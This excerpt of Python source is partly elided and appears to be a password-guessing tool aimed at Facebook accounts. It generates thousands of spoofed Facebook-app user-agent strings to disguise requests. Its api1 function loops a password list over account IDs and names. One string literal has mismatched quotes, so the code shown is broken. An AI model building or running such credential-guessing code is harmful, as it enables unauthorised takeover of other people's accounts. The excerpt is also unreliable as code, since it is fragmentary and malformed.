...
for nt in range(10000):
	...
	xx=f"Mozilla/5.0 (Linux; Android 12; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/90.0.4430.81 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.0.0.14.188]"
	rug.append(xx)
ruz=[]
for mtc in range(10000):
	rr=random.randint
	xd=f"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/94.0.4606.25 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/362.0.0.12.166]"
	ruz.append(xd)
...
def api1(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/376.0.0.12.108;FBBV/315213325;[FBAN/FB4A;FBAV/376.0.0.12.108;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/315213325;FBCR/Plusnet Mobile;FBMF/OPPO;FBBD/oppo;FBDV/CPH2485;FBSV/13.8.3;FBCA/x86:arm64-v8a]"
				li = ['28','29','210']
